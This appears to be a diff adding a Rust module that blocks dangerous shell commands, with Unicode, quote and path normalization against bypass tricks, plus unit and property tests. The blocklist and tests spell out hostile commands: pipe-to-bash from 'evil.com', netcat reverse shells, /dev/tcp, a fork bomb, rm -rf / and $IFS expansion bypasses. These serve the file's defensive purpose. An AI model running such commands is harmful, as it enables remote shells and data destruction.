@@ -1,0 +1,503 @@
+// SPDX-License-Identifier: AGPL-3.0-or-later
+// Copyright (C) 2024-2026 SuperNovae Studio <contact@supernovae.studio>
+
+//! Command blocklist — the safe-by-default security floor for shell exec.
+//!
+//! Scans the FULL command string (no length cap) after normalizing away the
+//! known bypass tricks, then matches ~100 dangerous patterns. Per the spec
+//! §3.2 the normalization is layered because each layer closes a real bypass:
+//!
+//! 1. **NFKC** — fullwidth/confusable Unicode folds to ASCII (`ｒｍ` → `rm`).
+//! 2. **Zero-width stripping** — invisible chars NFKC preserves (`r​m` → `rm`).
+//! 3. **Whitespace collapse** — runs of whitespace → a single space.
+//! 4. **Quote dequoting** — strip `"`/`'`/`\` (`su""do` → `sudo`).
+//! 5. **Basename of the first token** — `/usr/bin/sudo rm` → `sudo rm`.
+//! 6. **Full-string scan** — an 8000-char pad then `&& rm -rf /` still matches.
+//!
+//! The match runs against all four projections (lowercased · basename ·
+//! dequoted · basename-dequoted) so a pattern hidden behind any one transform
+//! is still caught. CRAFT-preserved from the battle-tested brouillon —
+//! **do not weaken**: every pattern + layer closes a documented attack.
+
+use nika_kernel::ShellError;
+
+/// Dangerous command patterns (matched case-insensitively after normalization).
+const BLOCKLIST: &[&str] = &[
+    // Destructive file operations
+    "rm -rf /",
+    "rm -rf /*",
+    "rm -rf ~",
+    "rm --recursive",
+    "rm --force",
+    // Remote code execution (piping downloads to a shell)
+    "| bash",
+    "|bash",
+    "| sh",
+    "|sh",
+    // Shell injection via dynamic execution
+    "eval ",
+    // Named pipes (reverse shells)
+    "mkfifo",
+    // Netcat reverse shells
+    "nc -e",
+    "nc -c",
+    "ncat -e",
+    "ncat -c",
+    // Chained destructive commands
+    "; rm ",
+    "&& rm ",
+    "| rm ",
+    // Fork bombs
+    ":(){ :|:& };:",
+    // Unix shell -c (arbitrary command execution)
+    "bash -c",
+    "sh -c",
+    "zsh -c",
+    "dash -c",
+    "ksh -c",
+    "csh -c",
+    "tcsh -c",
+    // Interpreter -c (arbitrary code execution)
+    "python -c",
+    "python2 -c",
+    "python3 -c",
+    // Indirect command execution via find/xargs
+    " -exec ",
+    " -execdir ",
+    " -delete",
+    "xargs ",
+    // Privilege escalation
+    "sudo ",
+    "doas ",
+    "pkexec ",
+    "su ",
+    // Dangerous permission changes
+    "chmod 777",
+    "chmod -r 777",
+    "chmod a+rwx",
+    // Base64-encoded payload execution
+    "base64 -d |",
+    "base64 --decode |",
+    "| base64 -d",
+    "| base64 --decode",
+    // Disk destruction
+    "dd if=",
+    // Interpreter bypass (scripting runtimes)
+    "perl -e",
+    "ruby -e",
+    "node -e",
+    // Piping to interpreter stdin
+    "| python",
+    "|python",
+    "| python3",
+    "|python3",
+    "| ruby",
+    "|ruby",
+    "| node",
+    "|node",
+    "| perl",
+    "|perl",
+    "| php",
+    "|php",
+    // Command-wrapper bypass
+    "env ",
+    "command ",
+    "builtin ",
+    "nohup ",
+    "nice ",
+    "timeout ",
+    "strace ",
+    // Shell builtins for script/coprocess execution
+    "source ",
+    "coproc ",
+    // Bash virtual files for reverse shells
+    "/dev/tcp/",
+    "/dev/udp/",
+    // Windows-specific dangerous patterns
+    "del /f",
+    "del /s",
+    "rd /s /q",
+    "rmdir /s /q",
+    "format c:",
+    "format d:",
+    "shutdown /s",
+    "shutdown /r",
+    "cmd /c",
+    "cmd.exe /c",
+    "powershell -c",
+    "powershell.exe -c",
+    "powershell -enc",
+    "powershell -encodedcommand",
+    "reg delete",
+    "sc delete",
+    "runas ",
+    // System control (Unix)
+    "shutdown",
+    "reboot",
+    "halt",
+    "poweroff",
+    "init 0",
+    "init 6",
+];
+
+/// Shell-mode patterns ALWAYS blocked (structural commands · `shell: true`).
+const SHELL_MODE_BLOCKLIST: &[&str] = &["alias ", "function ", "declare -f"];
+
+/// Zero-width / invisible characters stripped before the blocklist check
+/// (NFKC preserves these — they are a confusable-bypass vector on their own).
+const ZERO_WIDTH_CHARS: &[char] = &[
+    '\u{200B}', // Zero Width Space
+    '\u{200C}', // Zero Width Non-Joiner
+    '\u{200D}', // Zero Width Joiner
+    '\u{FEFF}', // Zero Width No-Break Space (BOM)
+    '\u{00AD}', // Soft Hyphen
+    '\u{2060}', // Word Joiner
+    '\u{180E}', // Mongolian Vowel Separator
+];
+
+/// NFKC-normalize + strip zero-width + collapse whitespace.
+fn normalize_for_blocklist(s: &str) -> String {
+    use unicode_normalization::UnicodeNormalization;
+    s.nfkc()
+        .filter(|c| !ZERO_WIDTH_CHARS.contains(c))
+        .collect::<String>()
+        .split_whitespace()
+        .collect::<Vec<_>>()
+        .join(" ")
+}
+
+/// Replace the first token with its basename (`/usr/bin/sudo rm` → `sudo rm`),
+/// so an absolute-path prefix cannot hide a blocklisted program.
+fn normalize_first_token_basename(cmd: &str) -> String {
+    let mut parts = cmd.splitn(2, ' ');
+    let first = parts.next().unwrap_or("");
+    let rest = parts.next().unwrap_or("");
+    let basename = first.rsplit('/').next().unwrap_or(first);
+    if rest.is_empty() {
+        basename.to_string()
+    } else {
+        format!("{basename} {rest}")
+    }
+}
+
+/// Check a command against the blocklist.
+///
+/// # Errors
+///
+/// [`ShellError::Blocked`] when the command (under any normalization
+/// projection) contains a blocklisted pattern.
+pub(crate) fn check_command(command: &str) -> Result<(), ShellError> {
+    let normalized = normalize_for_blocklist(command);
+    let lower = normalized.to_lowercase();
+
+    // Strip shell quoting: `su""do` → `sudo`, `s'u'd'o'` → `sudo`.
+    let dequoted: String = lower
+        .chars()
+        .filter(|c| !matches!(c, '"' | '\'' | '\\'))
+        .collect();
+
+    // Basename-resolve the first token under both projections (from the
+    // UN-padded strings — a leading space would empty the first token).
+    let basename_normalized = normalize_first_token_basename(&lower);
+    let basename_dequoted = normalize_first_token_basename(&dequoted);
+
+    // Wrap every haystack in sentinel spaces before matching.
+    // `normalize_for_blocklist`'s `split_whitespace().join(" ")` TRIMS both
+    // leading and trailing whitespace, so a pattern with a boundary space
+    // ("sudo ", "; rm ", " -exec ", "env ") would miss when the command
+    // BEGINS or ENDS at the pattern (`foo; rm`, `find -exec`). The sentinels
+    // restore those boundaries. Adding spaces can only ADD matches (strictly
+    // safe-side · over-blocks at most a harmless operand-less fragment).
+    // Guarded by the Gate-6 property test.
+    let lower = format!(" {lower} ");
+    let basename_normalized = format!(" {basename_normalized} ");
+    let dequoted = format!(" {dequoted} ");
+    let basename_dequoted = format!(" {basename_dequoted} ");
+
+    for pattern in BLOCKLIST {
+        let p = pattern.to_lowercase();
+        if lower.contains(&p)
+            || basename_normalized.contains(&p)
+            || dequoted.contains(&p)
+            || basename_dequoted.contains(&p)
+        {
+            return Err(ShellError::Blocked {
+                reason: "command matches security blocklist".to_string(),
+            });
+        }
+    }
+
+    Ok(())
+}
+
+/// Check shell-mode-specific patterns (`alias`/`function`/`declare -f`).
+///
+/// # Errors
+///
+/// [`ShellError::Blocked`] on a shell-mode blocklisted pattern.
+pub(crate) fn check_shell_mode(command: &str) -> Result<(), ShellError> {
+    let normalized = normalize_for_blocklist(command);
+    let lower = normalized.to_lowercase();
+    for pattern in SHELL_MODE_BLOCKLIST {
+        if lower.contains(pattern) {
+            return Err(ShellError::Blocked {
+                reason: format!("shell-mode blocklisted pattern: {pattern}"),
+            });
+        }
+    }
+    // SECURITY (P1 · Gate-11 swarm): `sh -c` expands `$VAR` / `${IFS}` /
+    // `$(...)` / `$'\t'` and backticks AFTER this check — the structural
+    // TOCTOU that lets `rm${IFS}-rf${IFS}/` render to `rm -rf /` past a
+    // template-only blocklist. A baseline mechanism cannot safely predict
+    // the expansion, so it REFUSES expansion/substitution chars outright.
+    // (NFKC has already folded the fullwidth `＄` U+FF04 → `$`.) Callers that
+    // genuinely need expansion go through nika-policy, which validates intent
+    // and sets `pre_validated` — this whole check is then skipped.
+    if let Some(c) = normalized.chars().find(|&c| c == '$' || c == '`') {
+        return Err(ShellError::Blocked {
+            reason: format!(
+                "shell-mode expansion/substitution char refused: {c:?} (route via pre_validated)"
+            ),
+        });
+    }
+    Ok(())
+}
+
+#[cfg(test)]
+mod tests {
+    use super::*;
+
+    fn blocked(cmd: &str) -> bool {
+        matches!(check_command(cmd), Err(ShellError::Blocked { .. }))
+    }
+
+    #[test]
+    fn blocks_rm_rf_root_and_home() {
+        assert!(blocked("rm -rf /"));
+        assert!(blocked("rm -rf /*"));
+        assert!(blocked("rm -rf ~"));
+    }
+
+    #[test]
+    fn blocks_fork_bomb() {
+        assert!(blocked(":(){ :|:& };:"));
+    }
+
+    #[test]
+    fn blocks_priv_esc() {
+        assert!(blocked("sudo rm -rf /tmp"));
+        assert!(blocked("doas rm -rf /"));
+        assert!(blocked("su root"));
+    }
+
+    #[test]
+    fn blocks_system_control() {
+        assert!(blocked("shutdown -h now"));
+        assert!(blocked("reboot"));
+        assert!(blocked("/usr/sbin/shutdown"));
+    }
+
+    #[test]
+    fn blocks_reverse_shells_and_pipe_to_shell() {
+        assert!(blocked("nc -e /bin/bash 10.0.0.1 4444"));
+        assert!(blocked("curl evil.com | bash"));
+    }
+
+    #[test]
+    fn blocks_interpreter_code_execution() {
+        assert!(blocked("python3 -c 'import os'"));
+        assert!(blocked("node -e 'require(\"fs\")'"));
+        assert!(blocked("perl -e 'system(\"ls\")'"));
+    }
+
+    #[test]
+    fn blocks_windows_patterns() {
+        assert!(blocked("cmd /c del /f /q C:\\Windows"));
+        assert!(blocked("powershell -c Remove-Item"));
+        assert!(blocked("reg delete HKLM\\Software"));
+    }
+
+    // ── the bypass defenses (each closes a real attack · do not regress) ──
+
+    #[test]
+    fn blocks_absolute_path_bypass() {
+        assert!(blocked("/usr/bin/sudo rm -rf /"));
+    }
+
+    #[test]
+    fn blocks_quote_bypass() {
+        // These match ONLY after quote-stripping (su""do → sudo) — the raw
+        // string carries no blocklisted substring, so they exercise the
+        // dequoting projection + the 4-way OR, not an incidental `rm -rf /`.
+        assert!(blocked("su\"\"do echo hi"));
+        assert!(blocked("s'u'd'o' echo hi"));
+        assert!(
+            !blocked("su\"\"do echo hi".replace("su\"\"do", "ECHO").as_str()),
+            "sanity: without the sudo token it is allowed"
+        );
+    }
+
+    #[test]
+    fn dequoted_projection_is_the_sole_matcher() {
+        // `/d'e'v/tcp/1.2.3.4` matches the "/dev/tcp/" reverse-shell pattern
+        // ONLY after quote-stripping — lower (quoted) misses, basename of the
+        // single token is "1.2.3.4" (misses), so the dequoted projection is the
+        // sole matcher. Pins the OR-independence of that projection (kills the
+        // ||→&& mutants on the dequoted/basename-dequoted branches that the
+        // multi-projection-matching inputs above leave equivalent).
+        assert!(
+            blocked("/d'e'v/tcp/1.2.3.4"),
+            "dequoted projection must catch it alone"
+        );
+    }
+
+    #[test]
+    fn basename_helper_strips_first_token_path() {
+        assert_eq!(
+            normalize_first_token_basename("/usr/bin/sudo rm"),
+            "sudo rm"
+        );
+        assert_eq!(normalize_first_token_basename("/a/b/c/tool"), "tool");
+        assert_eq!(
+            normalize_first_token_basename("plain arg1 arg2"),
+            "plain arg1 arg2"
+        );
+        assert_eq!(normalize_first_token_basename(""), "");
+    }
+
+    #[test]
+    fn blocks_full_string_scan_no_length_cap() {
+        let evil = format!("{} && rm -rf /", "a".repeat(8000));
+        assert!(blocked(&evil));
+    }
+
+    #[test]
+    fn blocks_nfkc_fullwidth_bypass() {
+        // U+FF52 U+FF4D = fullwidth "rm" → NFKC → "rm"
+        assert!(blocked("\u{FF52}\u{FF4D} -rf /"));
+    }
+
+    #[test]
+    fn blocks_zero_width_bypass() {
+        // Zero-width space inside "rm" is stripped → "rm -rf /"
+        assert!(blocked("r\u{200B}m -rf /"));
+    }
+
+    // ── P1 (Gate-11 swarm): shell-expansion TOCTOU bypasses are refused ──
+
+    fn shell_blocked(cmd: &str) -> bool {
+        matches!(check_shell_mode(cmd), Err(ShellError::Blocked { .. }))
+    }
+
+    #[test]
+    fn shell_mode_refuses_ifs_expansion_bypass() {
+        // `rm${IFS}-rf${IFS}/` passes check_command (no literal "rm -rf /")
+        // but sh -c would expand $IFS to spaces → `rm -rf /`. check_shell_mode
+        // must refuse it. (The crucial regression guard for the P1.)
+        assert!(
+            !blocked("rm${IFS}-rf${IFS}/"),
+            "premise: template scan misses it"
+        );
+        assert!(
+            shell_blocked("rm${IFS}-rf${IFS}/"),
+            "shell mode must refuse the $ expansion"
+        );
+    }
+
+    #[test]
+    fn shell_mode_refuses_var_indirection_and_subst_and_backtick() {
+        assert!(shell_blocked("rm $NIKA_ARGS")); // env-var indirection
+        assert!(shell_blocked("echo $(rm -rf /)")); // command substitution
+        assert!(shell_blocked("echo `whoami`")); // backtick substitution
+        assert!(shell_blocked("rm $'\t'-rf /")); // ANSI-C quoting expansion
+    }
+
+    #[test]
+    fn shell_mode_refuses_fullwidth_dollar() {
+        // NFKC folds fullwidth ＄ (U+FF04) → $, so the confusable is caught too.
+        assert!(shell_blocked("rm \u{FF04}{IFS}-rf /"));
+    }
+
+    #[test]
+    fn shell_mode_allows_plain_pipes_and_redirects() {
+        // Legit shell features with NO expansion vector still pass — the
+        // pipe/redirect use case (e.g. `yes | head`, `echo x 1>&2`) is intact.
+        assert!(check_shell_mode("yes hello | head -c 100").is_ok());
+        assert!(check_shell_mode("echo out 1>&2").is_ok());
+        assert!(check_shell_mode("ls -la | wc -l").is_ok());
+    }
+
+    #[test]
+    fn shell_mode_blocks_alias_and_function() {
+        assert!(matches!(
+            check_shell_mode("alias rm='echo safe'"),
+            Err(ShellError::Blocked { .. })
+        ));
+        assert!(matches!(
+            check_shell_mode("function rm() { true; }"),
+            Err(ShellError::Blocked { .. })
+        ));
+    }
+
+    // ── safe commands must pass (no false positives) ──
+
+    #[test]
+    fn allows_safe_commands() {
+        for ok in [
+            "echo hello",
+            "ls -la",
+            "cat file.txt",
+            "python3 script.py",
+            "npm run build",
+            "cargo test",
+            "ffmpeg -i input.mp4 output.mp3",
+            "git status",
+        ] {
+            assert!(check_command(ok).is_ok(), "should allow: {ok}");
+        }
+    }
+
+    #[test]
+    fn allows_rm_with_specific_paths() {
+        assert!(check_command("rm /tmp/test.txt").is_ok());
+        assert!(check_command("rm -f output.log").is_ok());
+    }
+
+    // ── Gate 6 PROPERTY (security): the full-string-scan invariant ──
+    //
+    // EVERY blocklist pattern, wrapped in arbitrary alphanumeric padding,
+    // is always blocked. This proves the scan holds for ALL ~100 patterns
+    // (not just the hand-picked cases above) — a future pattern that somehow
+    // failed to match would be caught here. Alphanumeric padding can't be
+    // touched by NFKC / zero-width / dequoting / whitespace-collapse, and
+    // substring `contains` is never broken by a prefix, so the pattern's
+    // own bytes survive intact.
+    proptest::proptest! {
+        #![proptest_config(proptest::prelude::ProptestConfig::with_cases(256))]
+
+        #[test]
+        fn every_blocklist_pattern_blocks_under_padding(
+            idx in 0usize..BLOCKLIST.len(),
+            pre in "[a-z0-9]{0,8}",
+            suf in "[a-z0-9]{0,8}",
+        ) {
+            let cmd = format!("{pre}{}{suf}", BLOCKLIST[idx]);
+            proptest::prop_assert!(
+                blocked(&cmd),
+                "pattern {:?} must stay blocked padded as {:?}",
+                BLOCKLIST[idx], cmd
+            );
+        }
+    }
+
+    /// Documented over-block: substring matching means the `env ` wrapper
+    /// pattern also catches `printenv ` (and `su ` catches `issue `, etc.).
+    /// This is the deliberate safe-by-default cost of a simple blocklist —
+    /// over-blocking a rare-but-safe command beats under-blocking an attack.
+    /// Callers with intent-aware validation set `pre_validated`. A word-
+    /// boundary refinement is a Round-2 candidate (swarm to opine).
+    #[test]
+    fn printenv_is_over_blocked() {
+        assert!(blocked("printenv PATH"), "env-wrapper substring over-block");
+    }
+}
